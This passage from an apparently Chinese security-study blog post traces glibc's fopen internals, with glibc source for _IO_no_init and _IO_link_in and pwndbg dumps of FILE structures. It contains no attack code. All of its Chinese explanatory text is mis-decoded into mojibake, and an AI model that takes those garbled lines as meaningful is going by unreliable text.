&amp;_IO_wfile_jumps);</span><br><span class="line">  <span class="comment">//step2:NULLåˆå§‹åŒ–ç»“æ„ä½“æ•°ç»„  </span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<span class="comment">// è®¾ç½®vtableä¸º_IO_file_jumps</span></span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);<span class="comment">//step3:å°†fileç»“æ„ä½“é“¾æ¥è¿›å»_IO_list_all</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">//æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  æ•´ä¸ª<code>__fopen_internal</code>å‡½æ•°åŒ…å«å››ä¸ªéƒ¨åˆ†ï¼š</p><ol><li> mallocåˆ†é…å†…å­˜</li><li> <code>_IO_no_init</code> å¯¹fileç»“æ„ä½“è¿›è¡Œ<code>null</code>åˆå§‹åŒ–ã€‚</li><li> <code>_IO_file_init</code>å°†ç»“æ„ä½“é“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨ã€‚</li><li> <code>_IO_file_fopen</code>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶ã€‚</li></ol></blockquote><h3 id="step1-mallocåˆ†é…å†…å­˜ç©ºé—´"><a href="#step1-mallocåˆ†é…å†…å­˜ç©ºé—´" class="headerlink" title="step1:mallocåˆ†é…å†…å­˜ç©ºé—´"></a>step1:mallocåˆ†é…å†…å­˜ç©ºé—´</h3><p>å¯ä»¥çœ‹åˆ°å…ˆmallocäº† <code>sizeof (struct locked_FILE)</code>å¤§å°çš„ç»“æ„ä½“ï¼Œx64ä¸­ä¸º0x230ï¼ŒåŒ…å«äº†ä¸‰ä¸ªç»“æ„ä½“ï¼š<code>_IO_FILE_plus</code>ï¼Œ<code>_IO_lock_t</code>ï¼Œ<code>_IO_wide_data</code>ã€‚åˆ†åˆ«ä¸ºfpï¼Œlockï¼Œwdã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> new_f</span></span><br><span class="line"><span class="meta">$</span><span class="bash">3 = (struct locked_FILE *) 0x602010</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x602010-0x10</span></span><br><span class="line">0x602000:0x00000000000000000x0000000000000231</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> *new_f</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;</span></span><br><span class="line">  fp = &#123;</span><br><span class="line">    file = &#123;</span><br><span class="line">      _flags = 0, </span><br><span class="line">      _IO_read_ptr = 0x0, </span><br><span class="line">      _IO_read_end = 0x0, </span><br><span class="line">      _IO_read_base = 0x0, </span><br><span class="line">      _IO_write_base = 0x0, </span><br><span class="line">      _IO_write_ptr = 0x0, </span><br><span class="line">      _IO_write_end = 0x0, </span><br><span class="line">      _IO_buf_base = 0x0, </span><br><span class="line">      _IO_buf_end = 0x0, </span><br><span class="line">      _IO_save_base = 0x0, </span><br><span class="line">      _IO_backup_base = 0x0, </span><br><span class="line">      _IO_save_end = 0x0, </span><br><span class="line">      _markers = 0x0, </span><br><span class="line">      _chain = 0x0, </span><br><span class="line">      _fileno = 0, </span><br><span class="line">      _flags2 = 0, </span><br><span class="line">      _old_offset = 0, </span><br><span class="line">      _cur_column = 0, </span><br><span class="line">      _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">      _shortbuf = &quot;&quot;, </span><br><span class="line">      _lock = 0x0, </span><br><span class="line">      _offset = 0, </span><br><span class="line">      _codecvt = 0x0, </span><br><span class="line">      _wide_data = 0x0, </span><br><span class="line">      _freeres_list = 0x0, </span><br><span class="line">      _freeres_buf = 0x0, </span><br><span class="line">      __pad5 = 0, </span><br><span class="line">      _mode = 0, </span><br><span class="line">      _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">    &#125;, </span><br><span class="line">    vtable = 0x0</span><br><span class="line">  &#125;, </span><br><span class="line">  lock = &#123;</span><br><span class="line">    lock = 0, </span><br><span class="line">    cnt = 0, </span><br><span class="line">    owner = 0x0</span><br><span class="line">  &#125;, </span><br><span class="line">  wd = &#123;</span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _IO_state = &#123;</span><br><span class="line">      __count = 0, </span><br><span class="line">      __value = &#123;</span><br><span class="line">        __wch = 0, </span><br><span class="line">        __wchb = &quot;\000\000\000&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    _IO_last_state = &#123;</span><br><span class="line">      __count = 0, </span><br><span class="line">      __value = &#123;</span><br><span class="line">        __wch = 0, </span><br><span class="line">        __wchb = &quot;\000\000\000&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    _codecvt = &#123;</span><br><span class="line">      __codecvt_destr = 0x0, </span><br><span class="line">      __codecvt_do_out = 0x0, </span><br><span class="line">      __codecvt_do_unshift = 0x0, </span><br><span class="line">      __codecvt_do_in = 0x0, </span><br><span class="line">      __codecvt_do_encoding = 0x0, </span><br><span class="line">      __codecvt_do_always_noconv = 0x0, </span><br><span class="line">      __codecvt_do_length = 0x0, </span><br><span class="line">      __codecvt_do_max_length = 0x0, </span><br><span class="line">      __cd_in = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x6021b8</span><br><span class="line">        &#125;, </span><br><span class="line">        __combined = &#123;</span><br><span class="line">          __cd = &#123;</span><br><span class="line">            __nsteps = 0, </span><br><span class="line">            __steps = 0x0, </span><br><span class="line">            __data = 0x6021b8</span><br><span class="line">          &#125;, </span><br><span class="line">          __data = &#123;</span><br><span class="line">            __outbuf = 0x0, </span><br><span class="line">            __outbufend = 0x0, </span><br><span class="line">            __flags = 0, </span><br><span class="line">            __invocation_counter = 0, </span><br><span class="line">            __internal_use = 0, </span><br><span class="line">            __statep = 0x0, </span><br><span class="line">            __state = &#123;</span><br><span class="line">              __count = 0, </span><br><span class="line">              __value = &#123;</span><br><span class="line">                __wch = 0, </span><br><span class="line">                __wchb = &quot;\000\000\000&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, </span><br><span class="line">      __cd_out = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x6021f8</span><br><span class="line">        &#125;, </span><br><span class="line">        __combined = &#123;</span><br><span class="line">          __cd = &#123;</span><br><span class="line">            __nsteps = 0, </span><br><span class="line">            __steps = 0x0, </span><br><span class="line">            __data = 0x6021f8</span><br><span class="line">          &#125;, </span><br><span class="line">          __data = &#123;</span><br><span class="line">            __outbuf = 0x0, </span><br><span class="line">            __outbufend = 0x0, </span><br><span class="line">            __flags = 0, </span><br><span class="line">            __invocation_counter = 0, </span><br><span class="line">            __internal_use = 0, </span><br><span class="line">            __statep = 0x0, </span><br><span class="line">            __state = &#123;</span><br><span class="line">              __count = 0, </span><br><span class="line">              __value = &#123;</span><br><span class="line">                __wch = 0, </span><br><span class="line">                __wchb = &quot;\000\000\000&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    _shortbuf = L&quot;&quot;, </span><br><span class="line">    _wide_vtable = 0x0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="step2-IO-no-init-å¯¹fileç»“æ„ä½“è¿›è¡Œnullåˆå§‹åŒ–"><a href="#step2-IO-no-init-å¯¹fileç»“æ„ä½“è¿›è¡Œnullåˆå§‹åŒ–" class="headerlink" title="step2:_IO_no_init å¯¹fileç»“æ„ä½“è¿›è¡Œnullåˆå§‹åŒ–"></a>step2:_IO_no_init å¯¹fileç»“æ„ä½“è¿›è¡Œnullåˆå§‹åŒ–</h3><p>åˆ†é…å®Œåï¼Œè°ƒç”¨äº†<code>_IO_no_init</code>åˆå§‹åŒ–æ”¹ç»“æ„ä½“</p><p>è·Ÿè¿›å»ï¼Œåœ¨<code>/libio/genops.c</code>ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_old_init (_IO_FILE *fp, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _IO_no_init (_IO_FILE *fp, <span class="keyword">int</span> flags, <span class="keyword">int</span> orientation,</span><br><span class="line">     struct _IO_wide_data *wd, <span class="keyword">const</span> struct _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//åˆå§‹åŒ–_wide_dataå­—æ®µ</span></span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (struct _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–äº†<code>locked_FILE</code>ç»“æ„ä½“ä¸­çš„<code>_IO_FILE_plus</code>ç»“æ„ä½“ï¼Œä»¥åŠå…¶ä¸­çš„<code>_wide_data</code>å­—æ®µï¼Œæ‰§è¡Œå®Œ<code>IO_no_init</code>åï¼š </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> new_f-&gt;fp</span></span><br><span class="line"><span class="meta">$</span><span class="bash">4 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72548352, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="step3-IO-file-initå°†ç»“æ„ä½“é“¾æ¥è¿›-IO-list-all"><a href="#step3-IO-file-initå°†ç»“æ„ä½“é“¾æ¥è¿›-IO-list-all" class="headerlink" title="step3: _IO_file_initå°†ç»“æ„ä½“é“¾æ¥è¿›_IO_list_all"></a>step3: _IO_file_initå°†ç»“æ„ä½“é“¾æ¥è¿›_IO_list_all</h3><p>å›åˆ°<code>__fopen_internal</code>åï¼Œå‡½æ•°å°†<code>_IO_FILE_plus</code>ç»“æ„ä½“çš„vtableè®¾ç½®æˆäº†<code>_IO_file_jumps</code>ï¼Œç„¶åè°ƒç”¨<code>_IO_file_init</code>å°†<code>_IO_FILE_plus</code>ç»“æ„ä½“é“¾æ¥è¿›å…¥<code>_IO_list_all</code>é“¾è¡¨ï¼Œè·Ÿè¿›å»åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_new_file_init (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_link_inå¹¶è®¾ç½®_fileno</span></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_init, _IO_file_init)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> *fp</span></span><br><span class="line"><span class="meta">$</span><span class="bash">9 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72548352, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿ<code>_IO_link_in</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥_flagsæ ‡å¿—ä½æ˜¯å¦æ˜¯_IO_LINKED</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//è®¾ç½®æ ‡å¿—ä½</span></span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_link_in)</span><br></pre></td></tr></table></figure><p>FILEç»“æ„ä½“æ˜¯é€šè¿‡<code>_IO_list_all</code>çš„å•é“¾è¡¨æ¥è¿›è¡Œç®¡ç†çš„ ï¼Œè¿™é‡Œ<code>_IO_link_in</code>æ˜¯æ£€æŸ¥FILEç»“æ„ä½“æ˜¯å¦åŒ…å«<code>_IO_LINKED</code>æ 